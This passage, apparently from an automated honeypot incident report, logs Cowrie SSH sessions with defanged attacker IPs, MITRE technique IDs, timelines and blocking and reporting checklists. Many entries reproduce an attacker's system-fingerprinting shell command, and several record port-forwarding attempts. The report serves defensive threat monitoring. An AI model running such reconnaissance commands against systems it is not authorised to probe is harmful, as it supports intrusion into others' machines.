| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:20:43` | `cowrie.session.connect` |
| `2026-07-17 05:20:44` | `cowrie.client.version` |
| `2026-07-17 05:20:44` | `cowrie.client.kex` |
| `2026-07-17 05:20:45` | `cowrie.login.success` |
| `2026-07-17 05:20:47` | `cowrie.session.params` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.success` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.command.input` |
| `2026-07-17 05:20:47` | `cowrie.log.closed` |
| `2026-07-17 05:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b450a282af

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-07-17 05:21 |
| **Last Seen** | 2026-07-17 05:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:21:47` | `cowrie.session.connect` |
| `2026-07-17 05:21:48` | `cowrie.client.version` |
| `2026-07-17 05:21:48` | `cowrie.client.kex` |
| `2026-07-17 05:21:50` | `cowrie.login.success` |
| `2026-07-17 05:21:50` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ffc0dd01e5

| Field | Detail |
|---|---|
| **Source IP** | `42.200.60[.]186` |
| **First Seen** | 2026-07-17 05:22 |
| **Last Seen** | 2026-07-17 05:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:22:00` | `cowrie.session.connect` |
| `2026-07-17 05:22:01` | `cowrie.client.version` |
| `2026-07-17 05:22:01` | `cowrie.client.kex` |
| `2026-07-17 05:22:04` | `cowrie.login.success` |
| `2026-07-17 05:22:04` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.60[.]186` to AbuseIPDB if not already reported
- [ ] Block `42.200.60[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e04685f99de2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:22 |
| **Last Seen** | 2026-07-17 05:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:22:14` | `cowrie.session.connect` |
| `2026-07-17 05:22:15` | `cowrie.client.version` |
| `2026-07-17 05:22:15` | `cowrie.client.kex` |
| `2026-07-17 05:22:16` | `cowrie.login.success` |
| `2026-07-17 05:22:18` | `cowrie.session.params` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.success` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.command.input` |
| `2026-07-17 05:22:18` | `cowrie.log.closed` |
| `2026-07-17 05:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4146f9faa3a2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:23 |
| **Last Seen** | 2026-07-17 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:23:45` | `cowrie.session.connect` |
| `2026-07-17 05:23:46` | `cowrie.client.version` |
| `2026-07-17 05:23:46` | `cowrie.client.kex` |
| `2026-07-17 05:23:47` | `cowrie.login.success` |
| `2026-07-17 05:23:49` | `cowrie.session.params` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.success` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:49` | `cowrie.command.input` |
| `2026-07-17 05:23:50` | `cowrie.log.closed` |
| `2026-07-17 05:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91cfaab3f4ce

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:25 |
| **Last Seen** | 2026-07-17 05:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:25:15` | `cowrie.session.connect` |
| `2026-07-17 05:25:15` | `cowrie.client.version` |
| `2026-07-17 05:25:15` | `cowrie.client.kex` |
| `2026-07-17 05:25:17` | `cowrie.login.success` |
| `2026-07-17 05:25:19` | `cowrie.session.params` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.success` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.command.input` |
| `2026-07-17 05:25:19` | `cowrie.log.closed` |
| `2026-07-17 05:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba24fb15a8a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:26 |
| **Last Seen** | 2026-07-17 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:26:41` | `cowrie.session.connect` |
| `2026-07-17 05:26:42` | `cowrie.client.version` |
| `2026-07-17 05:26:42` | `cowrie.client.kex` |
| `2026-07-17 05:26:43` | `cowrie.login.success` |
| `2026-07-17 05:26:44` | `cowrie.session.params` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.success` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:44` | `cowrie.command.input` |
| `2026-07-17 05:26:45` | `cowrie.log.closed` |
| `2026-07-17 05:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af98b4cb7c7b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:28 |
| **Last Seen** | 2026-07-17 05:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:28:09` | `cowrie.session.connect` |
| `2026-07-17 05:28:10` | `cowrie.client.version` |
| `2026-07-17 05:28:10` | `cowrie.client.kex` |
| `2026-07-17 05:28:11` | `cowrie.login.success` |
| `2026-07-17 05:28:12` | `cowrie.session.params` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.success` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:12` | `cowrie.command.input` |
| `2026-07-17 05:28:13` | `cowrie.log.closed` |
| `2026-07-17 05:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a6d1e2b4eb3

| Field | Detail |
|---|---|
| **Source IP** | `14.153.235[.]88` |
| **First Seen** | 2026-07-17 05:29 |
| **Last Seen** | 2026-07-17 05:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:29:29` | `cowrie.session.connect` |
| `2026-07-17 05:29:30` | `cowrie.client.version` |
| `2026-07-17 05:29:30` | `cowrie.client.kex` |
| `2026-07-17 05:29:32` | `cowrie.login.success` |
| `2026-07-17 05:29:34` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.235[.]88` to AbuseIPDB if not already reported
- [ ] Block `14.153.235[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a59b96209db

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:29 |
| **Last Seen** | 2026-07-17 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:29:38` | `cowrie.session.connect` |
| `2026-07-17 05:29:38` | `cowrie.client.version` |
| `2026-07-17 05:29:38` | `cowrie.client.kex` |
| `2026-07-17 05:29:40` | `cowrie.login.success` |
| `2026-07-17 05:29:41` | `cowrie.session.params` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.success` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:41` | `cowrie.command.input` |
| `2026-07-17 05:29:42` | `cowrie.log.closed` |
| `2026-07-17 05:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e960c50837

| Field | Detail |
|---|---|
| **Source IP** | `14.98.28[.]43` |
| **First Seen** | 2026-07-17 05:29 |
| **Last Seen** | 2026-07-17 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:29:39` | `cowrie.session.connect` |
| `2026-07-17 05:29:39` | `cowrie.client.version` |
| `2026-07-17 05:29:39` | `cowrie.client.kex` |
| `2026-07-17 05:29:41` | `cowrie.login.success` |
| `2026-07-17 05:29:42` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.98.28[.]43` to AbuseIPDB if not already reported
- [ ] Block `14.98.28[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81fd95e17a41

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:31 |
| **Last Seen** | 2026-07-17 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:31:07` | `cowrie.session.connect` |
| `2026-07-17 05:31:08` | `cowrie.client.version` |
| `2026-07-17 05:31:08` | `cowrie.client.kex` |
| `2026-07-17 05:31:09` | `cowrie.login.success` |
| `2026-07-17 05:31:10` | `cowrie.session.params` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.success` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:10` | `cowrie.command.input` |
| `2026-07-17 05:31:11` | `cowrie.log.closed` |
| `2026-07-17 05:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a19801f6ced

| Field | Detail |
|---|---|
| **Source IP** | `216.218.206[.]67` |
| **First Seen** | 2026-07-17 05:31 |
| **Last Seen** | 2026-07-17 05:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:31:41` | `cowrie.session.connect` |
| `2026-07-17 05:31:41` | `cowrie.login.success` |
| `2026-07-17 05:31:41` | `cowrie.session.params` |
| `2026-07-17 05:31:41` | `cowrie.command.input` |
| `2026-07-17 05:31:41` | `cowrie.command.input` |
| `2026-07-17 05:31:41` | `cowrie.command.failed` |
| `2026-07-17 05:31:41` | `cowrie.command.input` |
| `2026-07-17 05:31:41` | `cowrie.command.failed` |
| `2026-07-17 05:31:41` | `cowrie.command.input` |
| `2026-07-17 05:31:41` | `cowrie.log.closed` |
| `2026-07-17 05:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.218.206[.]67` to AbuseIPDB if not already reported
- [ ] Block `216.218.206[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73145714d1be

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:32 |
| **Last Seen** | 2026-07-17 05:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:32:39` | `cowrie.session.connect` |
| `2026-07-17 05:32:39` | `cowrie.client.version` |
| `2026-07-17 05:32:39` | `cowrie.client.kex` |
| `2026-07-17 05:32:41` | `cowrie.login.success` |
| `2026-07-17 05:32:42` | `cowrie.session.params` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.success` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.command.input` |
| `2026-07-17 05:32:42` | `cowrie.log.closed` |
| `2026-07-17 05:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fecfd878537

| Field | Detail |
|---|---|
| **Source IP** | `222.190.110[.]210` |
| **First Seen** | 2026-07-17 05:32 |
| **Last Seen** | 2026-07-17 05:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:32:53` | `cowrie.session.connect` |
| `2026-07-17 05:32:53` | `cowrie.client.version` |
| `2026-07-17 05:32:53` | `cowrie.client.kex` |
| `2026-07-17 05:32:57` | `cowrie.login.success` |
| `2026-07-17 05:32:59` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.190.110[.]210` to AbuseIPDB if not already reported
- [ ] Block `222.190.110[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b378f57e348

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:34 |
| **Last Seen** | 2026-07-17 05:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
